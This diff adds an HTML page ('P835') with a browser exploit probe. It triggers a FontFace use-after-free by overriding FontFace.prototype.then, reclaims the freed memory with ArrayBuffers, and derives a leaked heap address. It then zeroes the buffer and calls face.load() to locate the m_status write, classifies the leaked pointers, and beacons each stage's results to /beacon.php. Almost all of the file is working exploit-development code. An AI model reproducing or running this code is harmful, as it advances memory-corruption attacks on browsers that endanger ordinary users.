@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P835</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P835: face.load() Trigger — m_status Discovery + Pointer Write Detection</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P835-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+log('Booting P835...','info');
+
+/* ===== FontFace UAF trigger ===== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find reclaimed AB */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz);
+    log('Reclaim missed, reloading...','fail');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  var ab=fabs[bestI];
+  var bu=new BigUint64Array(ab);
+  var u8=new Uint8Array(ab);
+
+  /* Compute H from q11 */
+  var q11=bu[11];
+  var q11lo=Number(q11&0xFFFFFFFFn);
+  var q11hi=Number(q11>>32n);
+  var Hstr='unknown';
+  if(q11hi>0){
+    var borrow=(q11lo<0x68)?1:0;
+    var H_hi=q11hi-borrow,H_lo=(q11lo-0x68)>>>0;
+    Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+  }
+  bn('HEAP','H='+Hstr+'|nz='+bestNz);
+  log('H = '+Hstr+' | AB['+bestI+'] nz='+bestNz,'ok');
+
+  /* ===== PHASE A: Dump pre-load AB state (baseline) ===== */
+  var baseline=new Uint8Array(192);
+  baseline.set(u8);
+
+  var baseNzBytes=[];
+  for(var i=0;i<192;i++){
+    if(u8[i]!==0)baseNzBytes.push('+'+i.toString(16)+'=0x'+u8[i].toString(16).padStart(2,'0'));
+  }
+  bn('BASELINE-BYTES',baseNzBytes.join('|'));
+  log('Baseline nonzero bytes ('+baseNzBytes.length+'): '+baseNzBytes.join(' '),'info');
+
+  /* ===== PHASE B: Zero the AB completely ===== */
+  log('','');
+  log('--- Phase B: Zeroing entire AB ---','hot');
+  for(var i=0;i<24;i++)bu[i]=0n;
+
+  /* Verify zero */
+  var allZero=true;
+  for(var i=0;i<192;i++)if(u8[i]!==0){allZero=false;break;}
+  log('AB zeroed: '+(allZero?'YES':'NO'),'info');
+  bn('ZEROED','ok='+allZero);
+
+  /* ===== PHASE C: Call face.load() ===== */
+  /* CSSFontFace::load() checks m_status. If m_status=0 (Pending), it calls pump().
+     pump() with empty m_sources (size=0) sets m_status=4 (Failure).
+     This WRITES to the real m_status byte in our AB! */
+  log('','');
+  log('--- Phase C: Calling face.load() ---','hot');
+
+  var loadResult='CRASH';
+  var loadErr='';
+  try{
+    var r=face.load();
+    loadResult='OK';
+    if(r&&typeof r.then==='function')loadResult='PROMISE';
+  }catch(e){
+    loadResult='EXCEPTION';
+    loadErr=e.message||'';
+  }
+  bn('LOAD','result='+loadResult+'|err='+loadErr.slice(0,60));
+  log('face.load() = '+loadResult+(loadErr?' ('+loadErr+')':''),'info');
+
+  /* ===== PHASE D: Scan AB for changes ===== */
+  log('','');
+  log('--- Phase D: Post-load AB scan ---','hot');
+
+  var changedBytes=[];
+  var newNzBytes=[];
+  for(var i=0;i<192;i++){
+    if(u8[i]!==0){
+      newNzBytes.push('+'+i.toString(16)+'=0x'+u8[i].toString(16).padStart(2,'0'));
+      changedBytes.push({off:i,val:u8[i]});
+    }
+  }
+
+  log('Post-load nonzero bytes ('+newNzBytes.length+'): '+newNzBytes.join(' '),'ok');
+  bn('POST-LOAD-BYTES',newNzBytes.join('|'));
+
+  /* Look for byte=4 (Failure status) */
+  var statusCandidates=[];
+  for(var i=0;i<changedBytes.length;i++){
+    if(changedBytes[i].val===4){
+      statusCandidates.push(changedBytes[i].off);
+    }
+  }
+  if(statusCandidates.length>0){
+    log('m_status candidates (val=4=Failure): bytes ['+statusCandidates.join(',')+']','hot');
+    bn('STATUS-CANDIDATES','offsets='+statusCandidates.join(','));
+  }
+
+  /* Dump all 24 qwords for full picture */
+  var qwordDump=[];
+  for(var q=0;q<24;q++){
+    var v=bu[q];
+    if(v!==0n)qwordDump.push('q'+q+'=0x'+v.toString(16).padStart(16,'0'));
+  }
+  if(qwordDump.length>0){
+    log('Nonzero qwords: '+qwordDump.join(' '),'info');
+    bn('QWORDS',qwordDump.join('|'));
+  }else{
+    log('All qwords still zero — load() wrote NOTHING','fail');
+  }
+
+  /* Classify any pointers that appeared */
+  for(var q=0;q<24;q++){
+    var v=bu[q];
+    if(v===0n)continue;
+    var hi=Number(v>>32n);
+    var lo=Number(v&0xFFFFFFFFn);
+    var cls='unknown';
+    if(hi>=0x100&&hi<0x800)cls='HEAP';
+    else if(hi>=0x800&&hi<0xFFFF)cls='CODE/LIB';
+    else if(hi>=0xFFFF0000)cls='KERNEL';
+    else if(hi===0&&lo<=0xFFFF)cls='small';
+    else if(hi===0)cls='lo32';
+    log('  q'+q+' (+0x'+(q*8).toString(16).padStart(2,'0')+'): 0x'+v.toString(16).padStart(16,'0')+' ['+cls+']',
+      cls==='CODE/LIB'?'hot':cls==='HEAP'?'ok':'info');
+  }
+
+  /* ===== PHASE E: Try triggering load with fake m_status=0 after delay ===== */
+  /* In case load() checked cached status, wait and try again */
+  log('','');
+  log('--- Phase E: Second load attempt after 100ms ---','hot');
+
+  /* Re-zero and set ONLY refcount=2 (safe to keep alive) */
+  for(var i=0;i<24;i++)bu[i]=0n;
+  bu[0]=2n; /* refcount=2, safe */
+
+  setTimeout(function(){
+    var load2='CRASH';
+    try{
+      face.load();
+      load2='OK';
+    }catch(e){
+      load2='ERR:'+e.message.slice(0,40);
+    }
+    bn('LOAD2','result='+load2);
+    log('Second face.load() = '+load2,'info');
+
+    /* Scan for changes again */
+    var nzAfter2=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==0)nzAfter2.push('+'+i.toString(16)+'=0x'+u8[i].toString(16).padStart(2,'0'));
+    }
+    log('Post-load2 nonzero: '+nzAfter2.join(' '),'info');
+    bn('POST-LOAD2',nzAfter2.join('|'));
+
+    /* ===== PHASE F: Try face.loaded promise ===== */
+    log('','');
+    log('--- Phase F: face.loaded promise test ---','hot');
+
+    /* Re-zero again */
+    for(var i=0;i<24;i++)bu[i]=0n;
+    bu[0]=2n;
+
+    var loadedResult='CRASH';
+    try{
+      var p=face.loaded;
+      loadedResult=(p&&typeof p.then==='function')?'PROMISE':'val='+String(p);
+    }catch(e){
+      loadedResult='ERR:'+e.message.slice(0,40);
+    }
+    bn('LOADED-PROP','result='+loadedResult);
+    log('face.loaded = '+loadedResult,'info');
+
+    /* Check if promise then/catch writes anything */
+    if(loadedResult==='PROMISE'){
+      try{
+        face.loaded.then(function(){
+          bn('LOADED-THEN','resolved');
+          /* Scan AB */
+          var nzThen=[];
+          for(var i=0;i<192;i++){
+            if(u8[i]!==0)nzThen.push('+'+i.toString(16)+'=0x'+u8[i].toString(16).padStart(2,'0'));
+          }
+          bn('POST-THEN',nzThen.join('|'));
+          log('Promise resolved, nz='+nzThen.length+': '+nzThen.join(' '),'ok');
+        }).catch(function(e){
+          bn('LOADED-CATCH',e&&e.message||'rejected');
+          log('Promise rejected: '+(e&&e.message||'?'),'fail');
+        });
+      }catch(e){
+        bn('LOADED-CHAIN-ERR',e.message);
+        log('Promise chain error: '+e.message,'fail');
+      }
+    }
+
+    /* ===== PHASE G: Final summary ===== */
+    setTimeout(function(){
+      log('','');
+      log('====== P835 SUMMARY ======','hot');
+      log('H = '+Hstr,'ok');
+      log('face.load() = '+loadResult,'info');
+      log('Post-load writes: '+newNzBytes.length+' bytes','info');
+      if(statusCandidates.length>0){
+        log('m_status offset candidates: bytes '+statusCandidates.join(', '),'hot');
+      }
+      log('face.loaded = '+loadedResult,'info');
+
+      /* Final full dump */
+      var finalNz=[];
+      for(var i=0;i<192;i++){
+        if(u8[i]!==0)finalNz.push('+'+i.toString(16)+'=0x'+u8[i].toString(16).padStart(2,'0'));
+      }
+      var finalQwords=[];
+      for(var q=0;q<24;q++){
+        if(bu[q]!==0n)finalQwords.push('q'+q+'=0x'+bu[q].toString(16).padStart(16,'0'));
+      }
+
+      var summary='H='+Hstr+'|load='+loadResult+'|postNz='+newNzBytes.length;
+      summary+='|statusOff='+statusCandidates.join(',')||'none';
+      summary+='|loaded='+loadedResult;
+      summary+='|finalNz='+finalNz.length;
+      bn('DONE',summary);
+
+      log('Final AB: '+finalNz.length+' nonzero bytes','info');
+      log('','');
+      log('=== P835 COMPLETE ===','ok');
+    },500);
+
+  },100);
+
+},800);
+</script></body></html>
